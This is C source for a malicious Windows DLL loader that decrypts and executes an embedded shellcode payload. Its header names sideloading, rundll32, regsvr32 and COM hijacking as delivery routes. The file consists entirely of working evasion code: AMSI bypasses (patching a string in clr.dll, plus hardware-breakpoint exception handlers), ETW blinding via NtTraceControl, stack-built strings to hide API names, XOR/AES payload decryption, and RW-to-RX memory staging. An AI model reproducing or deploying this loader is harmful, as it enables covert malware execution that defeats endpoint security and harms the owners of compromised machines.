/*
 * stager_stageless_dll.c — Crystal Palace PICO loader (stageless DLL)
 *
 * Delivery: single DLL — encrypted PICO embedded at compile time.
 *           Use via DLL sideloading, rundll32, regsvr32, or COM hijack.
 *
 * Evasion profile:
 *  - Dual-layer AMSI bypass identical to stager_remote.c:
 *    Layer 1: LdrRegisterDllNotification corrupts "AmsiScanBuffer" in
 *             clr.dll .rdata before CLR init (no amsi.dll patch).
 *    Layer 2: VEH + HWBP on AmsiScanBuffer + NtTraceControl (fallback).
 *  - ETW bypass via HWBP on NtTraceControl → STATUS_SUCCESS
 *  - AES-256-CBC via BCrypt + XOR rolling encode (entropy ~6.0-6.5)
 *  - VirtualAlloc(RW) + VirtualProtect(RX): no RWX ever held
 *  - IAT: kernel32, advapi32, bcrypt — all legitimate
 *  - GUI subsystem, version info resource, asInvoker manifest
 *  - Zero memory patches on amsi.dll or ntdll.dll
 *  - All loader logic runs from a spawned thread (not under loader lock)
 *
 * Build:
 *  x86_64-w64-mingw32-gcc -Wall -Os -shared -ffunction-sections \
 *      -fdata-sections -o loader.dll stager_stageless_dll.c resource_dll.o \
 *      -s -Wl,--gc-sections -ladvapi32 -lbcrypt
 */

#include <windows.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include "payload_stageless.h"

typedef void (*pico_fn)(void *);

/* ── Stack-built strings ───────────────────────────────────────────────── */

#define SPUT(p,i,c) do { volatile char *_v = &(p)[(i)]; *_v = (c); } while(0)
#define WPUT(p,i,c) do { volatile wchar_t *_v = &(p)[(i)]; *_v = (c); } while(0)

static void build_amsi_dll(char out[9])
{
    SPUT(out,0,'a'); SPUT(out,1,'m'); SPUT(out,2,'s'); SPUT(out,3,'i');
    SPUT(out,4,'.'); SPUT(out,5,'d'); SPUT(out,6,'l'); SPUT(out,7,'l');
    SPUT(out,8,0);
}
static void build_amsi_scan_buffer(char out[15])
{
    SPUT(out,0,'A'); SPUT(out,1,'m'); SPUT(out,2,'s'); SPUT(out,3,'i');
    SPUT(out,4,'S'); SPUT(out,5,'c'); SPUT(out,6,'a'); SPUT(out,7,'n');
    SPUT(out,8,'B'); SPUT(out,9,'u'); SPUT(out,10,'f'); SPUT(out,11,'f');
    SPUT(out,12,'e'); SPUT(out,13,'r'); SPUT(out,14,0);
}
static void build_ntdll(char out[10])
{
    SPUT(out,0,'n'); SPUT(out,1,'t'); SPUT(out,2,'d'); SPUT(out,3,'l');
    SPUT(out,4,'l'); SPUT(out,5,'.'); SPUT(out,6,'d'); SPUT(out,7,'l');
    SPUT(out,8,'l'); SPUT(out,9,0);
}
static void build_nt_trace_control(char out[15])
{
    SPUT(out,0,'N'); SPUT(out,1,'t'); SPUT(out,2,'T'); SPUT(out,3,'r');
    SPUT(out,4,'a'); SPUT(out,5,'c'); SPUT(out,6,'e'); SPUT(out,7,'C');
    SPUT(out,8,'o'); SPUT(out,9,'n'); SPUT(out,10,'t'); SPUT(out,11,'r');
    SPUT(out,12,'o'); SPUT(out,13,'l'); SPUT(out,14,0);
}

/* ══════════════════════════════════════════════════════════════════════════
 * LAYER 1 — CLR string corruption via LdrRegisterDllNotification
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DLL_NOTIFICATION_DATA {
    ULONG           Flags;
    UNICODE_STRING *FullDllName;
    UNICODE_STRING *BaseDllName;
    PVOID           DllBase;
    ULONG           SizeOfImage;
} LDR_DLL_NOTIFICATION_DATA;

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG reason, LDR_DLL_NOTIFICATION_DATA *data, PVOID ctx);

typedef NTSTATUS (NTAPI *pLdrRegisterDllNotification)(
    ULONG flags, PLDR_DLL_NOTIFICATION_FUNCTION cb, PVOID ctx, PVOID *cookie);

static PVOID g_amsi_scan_buf = NULL;
static PVOID g_nt_trace_ctl  = NULL;
static volatile LONG g_addrs_resolved = 0;

static volatile LONG g_clr_patched = 0;

static void corrupt_clr_amsi_string(PVOID dll_base)
{
    if (InterlockedCompareExchange(&g_clr_patched, 1, 0) == 1)
        return;

    char target[15];
    build_amsi_scan_buffer(target);
    int target_len = 14;

    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = (BYTE *)dll_base;

    while (VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.AllocationBase != dll_base)
            break;

        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_READWRITE ||
             mbi.Protect == PAGE_EXECUTE_READ ||
             mbi.Protect == PAGE_EXECUTE_READWRITE)) {

            SIZE_T region_size = mbi.RegionSize;
            BYTE *region = (BYTE *)mbi.BaseAddress;

            for (SIZE_T i = 0; i <= region_size - target_len; i++) {
                int match = 1;
                for (int j = 0; j < target_len; j++) {
                    if (region[i + j] != (BYTE)target[j]) {
                        match = 0;
                        break;
                    }
                }
                if (match) {
                    BYTE *patch_addr = region + i;
                    DWORD old_prot;
                    VirtualProtect(patch_addr, target_len,
                                   PAGE_READWRITE, &old_prot);
                    volatile BYTE *vb = patch_addr;
                    *vb = 'X';
                    VirtualProtect(patch_addr, target_len,
                                   old_prot, &old_prot);
                }
            }
        }

        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
    }
}

static void set_hwbp_on_self(void)
{
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext((HANDLE)(LONG_PTR)-2, &ctx)) return;

    int dirty = 0;
    if (g_amsi_scan_buf && ctx.Dr0 != (DWORD64)g_amsi_scan_buf) {
        ctx.Dr0 = (DWORD64)g_amsi_scan_buf;
        ctx.Dr7 |= 1;
        ctx.Dr7 &= ~(0xFULL << 16);
        dirty = 1;
    }
    if (g_nt_trace_ctl && ctx.Dr1 != (DWORD64)g_nt_trace_ctl) {
        ctx.Dr1 = (DWORD64)g_nt_trace_ctl;
        ctx.Dr7 |= (1 << 2);
        ctx.Dr7 &= ~(0xFULL << 20);
        dirty = 1;
    }
    if (dirty)
        SetThreadContext((HANDLE)(LONG_PTR)-2, &ctx);
}

static int wchar_icmp(const wchar_t *a, const wchar_t *b, int len)
{
    for (int i = 0; i < len; i++) {
        wchar_t ca = a[i], cb = b[i];
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return 0;
    }
    return 1;
}

static VOID CALLBACK dll_load_callback(
    ULONG reason, LDR_DLL_NOTIFICATION_DATA *data, PVOID ctx)
{
    (void)ctx;
    if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED)
        return;
    if (!data || !data->BaseDllName || !data->BaseDllName->Buffer)
        return;

    UNICODE_STRING *name = data->BaseDllName;
    int nchars = name->Length / sizeof(wchar_t);

    /* clr.dll — Layer 1: corrupt AmsiScanBuffer string */
    if (nchars == 7) {
        wchar_t clr_name[8];
        WPUT(clr_name,0,L'c'); WPUT(clr_name,1,L'l'); WPUT(clr_name,2,L'r');
        WPUT(clr_name,3,L'.'); WPUT(clr_name,4,L'd'); WPUT(clr_name,5,L'l');
        WPUT(clr_name,6,L'l'); WPUT(clr_name,7,0);

        if (wchar_icmp(name->Buffer, clr_name, 7))
            corrupt_clr_amsi_string(data->DllBase);
    }

    /* amsi.dll — resolve AmsiScanBuffer + set HWBP on THIS thread */
    if (nchars == 8) {
        wchar_t amsi_name[9];
        WPUT(amsi_name,0,L'a'); WPUT(amsi_name,1,L'm');
        WPUT(amsi_name,2,L's'); WPUT(amsi_name,3,L'i');
        WPUT(amsi_name,4,L'.'); WPUT(amsi_name,5,L'd');
        WPUT(amsi_name,6,L'l'); WPUT(amsi_name,7,L'l');
        WPUT(amsi_name,8,0);

        if (wchar_icmp(name->Buffer, amsi_name, 8)) {
            char s_asb[15];
            build_amsi_scan_buffer(s_asb);
            PVOID addr = (PVOID)GetProcAddress(
                (HMODULE)data->DllBase, s_asb);
            if (addr) {
                g_amsi_scan_buf = addr;
                set_hwbp_on_self();
            }
        }
    }
}

static PVOID g_dll_notif_cookie = NULL;

static void register_dll_notification(void)
{
    char s_ntdll[10];
    build_ntdll(s_ntdll);
    HMODULE ntdll = GetModuleHandleA(s_ntdll);
    if (!ntdll) return;

    char fn_name[30];
    SPUT(fn_name,0,'L');  SPUT(fn_name,1,'d');  SPUT(fn_name,2,'r');
    SPUT(fn_name,3,'R');  SPUT(fn_name,4,'e');  SPUT(fn_name,5,'g');
    SPUT(fn_name,6,'i');  SPUT(fn_name,7,'s');  SPUT(fn_name,8,'t');
    SPUT(fn_name,9,'e');  SPUT(fn_name,10,'r'); SPUT(fn_name,11,'D');
    SPUT(fn_name,12,'l'); SPUT(fn_name,13,'l'); SPUT(fn_name,14,'N');
    SPUT(fn_name,15,'o'); SPUT(fn_name,16,'t'); SPUT(fn_name,17,'i');
    SPUT(fn_name,18,'f'); SPUT(fn_name,19,'i'); SPUT(fn_name,20,'c');
    SPUT(fn_name,21,'a'); SPUT(fn_name,22,'t'); SPUT(fn_name,23,'i');
    SPUT(fn_name,24,'o'); SPUT(fn_name,25,'n'); SPUT(fn_name,26,0);

    pLdrRegisterDllNotification fn =
        (pLdrRegisterDllNotification)GetProcAddress(ntdll, fn_name);
    if (fn)
        fn(0, dll_load_callback, NULL, &g_dll_notif_cookie);
}

/* ══════════════════════════════════════════════════════════════════════════
 * LAYER 2 — VEH + HWBP fallback
 * ══════════════════════════════════════════════════════════════════════════ */

static LONG CALLBACK veh_handler(PEXCEPTION_POINTERS ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = ep->ContextRecord;

    if (g_amsi_scan_buf && (PVOID)ctx->Rip == g_amsi_scan_buf) {
        ctx->Rax = (DWORD64)0x80070057;
        ctx->Rip = *(DWORD64 *)ctx->Rsp;
        ctx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (g_nt_trace_ctl && (PVOID)ctx->Rip == g_nt_trace_ctl) {
        ctx->Rax = 0;
        ctx->Rip = *(DWORD64 *)ctx->Rsp;
        ctx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static void resolve_targets(void)
{
    if (InterlockedCompareExchange(&g_addrs_resolved, 1, 0) == 1)
        return;

    char s_ntdll[10];    build_ntdll(s_ntdll);
    char s_ntc[15];      build_nt_trace_control(s_ntc);

    HMODULE ntdll = GetModuleHandleA(s_ntdll);
    if (!ntdll) return;

    g_nt_trace_ctl = (PVOID)GetProcAddress(ntdll, s_ntc);
}

static void apply_hwbp_to_thread(DWORD tid)
{
    if (!g_amsi_scan_buf && !g_nt_trace_ctl) return;

    HANDLE hThread = OpenThread(
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
        FALSE, tid);
    if (!hThread) return;

    SuspendThread(hThread);

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(hThread, &ctx)) {
        int dirty = 0;
        if (g_amsi_scan_buf && ctx.Dr0 != (DWORD64)g_amsi_scan_buf) {
            ctx.Dr0 = (DWORD64)g_amsi_scan_buf;
            ctx.Dr7 |= 1;
            ctx.Dr7 &= ~(0xFULL << 16);
            dirty = 1;
        }
        if (g_nt_trace_ctl && ctx.Dr1 != (DWORD64)g_nt_trace_ctl) {
            ctx.Dr1 = (DWORD64)g_nt_trace_ctl;
            ctx.Dr7 |= (1 << 2);
            ctx.Dr7 &= ~(0xFULL << 20);
            dirty = 1;
        }
        if (dirty)
            SetThreadContext(hThread, &ctx);
    }

    ResumeThread(hThread);
    CloseHandle(hThread);
}

static void propagate_all_threads(void)
{
    DWORD pid = GetCurrentProcessId();
    DWORD self = GetCurrentThreadId();

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid && te.th32ThreadID != self)
                apply_hwbp_to_thread(te.th32ThreadID);
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext((HANDLE)(LONG_PTR)-2, &ctx)) {
        int dirty = 0;
        if (g_amsi_scan_buf && ctx.Dr0 != (DWORD64)g_amsi_scan_buf) {
            ctx.Dr0 = (DWORD64)g_amsi_scan_buf;
            ctx.Dr7 |= 1;
            ctx.Dr7 &= ~(0xFULL << 16);
            dirty = 1;
        }
        if (g_nt_trace_ctl && ctx.Dr1 != (DWORD64)g_nt_trace_ctl) {
            ctx.Dr1 = (DWORD64)g_nt_trace_ctl;
            ctx.Dr7 |= (1 << 2);
            ctx.Dr7 &= ~(0xFULL << 20);
            dirty = 1;
        }
        if (dirty)
            SetThreadContext((HANDLE)(LONG_PTR)-2, &ctx);
    }
}

/* ── CLR pre-warm (native API, no PICO hooks) ───────────────────────────── */

static void clr_prewarm(void)
{
    char s_msc[12];
    volatile char *mv = s_msc;
    mv[0]='m'; mv[1]='s'; mv[2]='c'; mv[3]='o'; mv[4]='r';
    mv[5]='e'; mv[6]='e'; mv[7]='.'; mv[8]='d'; mv[9]='l';
    mv[10]='l'; mv[11]=0;

    HMODULE mscoree = LoadLibraryA(s_msc);
    if (!mscoree) return;

    char s_cci[18];
    volatile char *cv = s_cci;
    cv[0]='C'; cv[1]='L'; cv[2]='R'; cv[3]='C'; cv[4]='r';
    cv[5]='e'; cv[6]='a'; cv[7]='t'; cv[8]='e'; cv[9]='I';
    cv[10]='n'; cv[11]='s'; cv[12]='t'; cv[13]='a'; cv[14]='n';
    cv[15]='c'; cv[16]='e'; cv[17]=0;

    typedef HRESULT (WINAPI *fnCLRCreateInstance)(
        const GUID *, const GUID *, void **);
    fnCLRCreateInstance pCreate = (fnCLRCreateInstance)
        GetProcAddress(mscoree, s_cci);
    if (!pCreate) return;

    static const GUID clsid_meta = {
        0x9280188d,0x0e8e,0x4867,
        {0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde}};
    static const GUID iid_meta = {
        0xD332DB9E,0xB9B3,0x4125,
        {0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
    static const GUID iid_rtinfo = {
        0xBD39D1D2,0xBA2F,0x486a,
        {0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
    static const GUID clsid_cor = {
        0xcb2f6723,0xab3a,0x11d2,
        {0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
    static const GUID iid_cor = {
        0xcb2f6722,0xab3a,0x11d2,
        {0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};

    void *metaHost = NULL;
    HRESULT hr = pCreate(&clsid_meta, &iid_meta, &metaHost);
    if (hr < 0 || !metaHost) return;

    void **mhVt = *(void ***)metaHost;
    void *rtInfo = NULL;
    WCHAR ver[] = L"v4.0.30319";
    hr = ((HRESULT (WINAPI *)(void *, LPCWSTR, const GUID *, void **))
          mhVt[3])(metaHost, ver, &iid_rtinfo, &rtInfo);
    if (hr < 0 || !rtInfo) return;

    void **riVt = *(void ***)rtInfo;
    void *corHost = NULL;
    hr = ((HRESULT (WINAPI *)(void *, const GUID *, const GUID *, void **))
          riVt[9])(rtInfo, &clsid_cor, &iid_cor, &corHost);
    if (hr < 0 || !corHost) return;

    void **chVt = *(void ***)corHost;
    ((HRESULT (WINAPI *)(void *))chVt[10])(corHost);
}

/* ── CLR pre-warm thread ─────────────────────────────────────────────────── */

static DWORD WINAPI hwbp_monitor(LPVOID param)
{
    (void)param;

    Sleep(5000);

    clr_prewarm();

    return 0;
}

/* ── Poseidon I/O noise ──────────────────────────────────────────────────── */

static void noise(void)
{
    unsigned char buf[0x1000];
    BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    wchar_t td[MAX_PATH], tf[MAX_PATH];
    if (GetTempPathW(MAX_PATH, td) && GetTempFileNameW(td, L"upd", 0, tf)) {
        HANDLE h = CreateFileW(tf, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(h, buf, sizeof(buf), &w, NULL);
            CloseHandle(h);
        }
    }

    SecureZeroMemory(buf, sizeof(buf));
}

/* ── XOR decode (rolling key) ───────────────────────────────────────────── */

static void xor_decode(BYTE *data, DWORD len, const BYTE *key, DWORD key_len)
{
    for (DWORD i = 0; i < len; i++)
        data[i] ^= key[i % key_len];
}

/* ── AES-256-CBC decrypt via BCrypt ──────────────────────────────────────── */

static BYTE *aes_cbc_decrypt(const BYTE *ct, DWORD ct_len, DWORD *pt_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE iv[16];
    DWORD out_len = 0;
    BYTE *pt = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
        return NULL;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)payload_key, payload_key_len, 0))
        goto cleanup;

    memcpy(iv, payload_iv, 16);
    BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                  iv, 16, NULL, 0, &out_len, BCRYPT_BLOCK_PADDING);

    pt = (BYTE *)LocalAlloc(LMEM_FIXED, out_len);
    if (!pt) goto cleanup;

    memcpy(iv, payload_iv, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                      iv, 16, pt, out_len, pt_len, BCRYPT_BLOCK_PADDING)) {
        LocalFree(pt);
        pt = NULL;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;
}

/* ── PICO execution thread ───────────────────────────────────────────────── */

static DWORD WINAPI pico_worker(LPVOID param)
{
    propagate_all_threads();
    ((pico_fn)param)(NULL);
    return 0;
}

/* ── Main loader thread (runs outside loader lock) ───────────────────────── */

static DWORD WINAPI main_loader(LPVOID param)
{
    (void)param;

    noise();

    register_dll_notification();
    resolve_targets();

    /* Register VEH via dynamic resolution */
    typedef PVOID (WINAPI *pAddVEH)(ULONG, PVOID);
    char s_aveh[30];
    volatile char *v = s_aveh;
    v[0]='A';  v[1]='d';  v[2]='d';  v[3]='V';  v[4]='e';  v[5]='c';
    v[6]='t';  v[7]='o';  v[8]='r';  v[9]='e';  v[10]='d'; v[11]='E';
    v[12]='x'; v[13]='c'; v[14]='e'; v[15]='p'; v[16]='t'; v[17]='i';
    v[18]='o'; v[19]='n'; v[20]='H'; v[21]='a'; v[22]='n'; v[23]='d';
    v[24]='l'; v[25]='e'; v[26]='r'; v[27]=0;
    pAddVEH fn_aveh = (pAddVEH)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), s_aveh);
    if (fn_aveh) fn_aveh(1, veh_handler);

    /* Registry touch: advapi32 import */
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* XOR decode embedded payload into a heap copy */
    BYTE *ct = (BYTE *)LocalAlloc(LMEM_FIXED, payload_enc_len);
    if (!ct) return 1;
    memcpy(ct, payload_enc, payload_enc_len);
    xor_decode(ct, payload_enc_len, payload_xor_key, payload_xor_key_len);

    /* AES-256-CBC decrypt */
    DWORD pt_len = 0;
    BYTE *pt = aes_cbc_decrypt(ct, payload_enc_len, &pt_len);
    SecureZeroMemory(ct, payload_enc_len);
    LocalFree(ct);
    if (!pt) return 1;

    /* Copy into RW region, wipe heap copy, flip to RX */
    void *rw = VirtualAlloc(NULL, pt_len, MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);
    if (!rw) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }

    memcpy(rw, pt, pt_len);
    SecureZeroMemory(pt, pt_len);
    LocalFree(pt);

    DWORD old;
    if (!VirtualProtect(rw, pt_len, PAGE_EXECUTE_READ, &old)) {
        VirtualFree(rw, 0, MEM_RELEASE);
        return 1;
    }

    /* Execute PICO on dedicated thread */
    HANDLE h = CreateThread(NULL, 0, pico_worker, rw, 0, NULL);
    if (!h) return 1;

    /* APC-based HWBP monitor — covers Go threads created after pico_worker */
    CreateThread(NULL, 0, hwbp_monitor, NULL, 0, NULL);

    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);

    for (;;) SleepEx(30000, TRUE);
}

/* ── DLL entry point ─────────────────────────────────────────────────────── */

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);
        CreateThread(NULL, 0, main_loader, NULL, 0, NULL);
    }
    return TRUE;
}

/* ── Exports for rundll32 / regsvr32 ─────────────────────────────────────── */

__declspec(dllexport) HRESULT DllRegisterServer(void)
{
    for (;;) SleepEx(30000, TRUE);
    return 0;
}

__declspec(dllexport) HRESULT DllUnregisterServer(void) { return 0; }

__declspec(dllexport) void CALLBACK StartW(
    HWND hwnd, HINSTANCE hinst, LPWSTR cmdline, int show)
{
    (void)hwnd; (void)hinst; (void)cmdline; (void)show;
    for (;;) SleepEx(30000, TRUE);
}

__declspec(dllexport) void VoidFunc(void)
{
    for (;;) SleepEx(30000, TRUE);
}
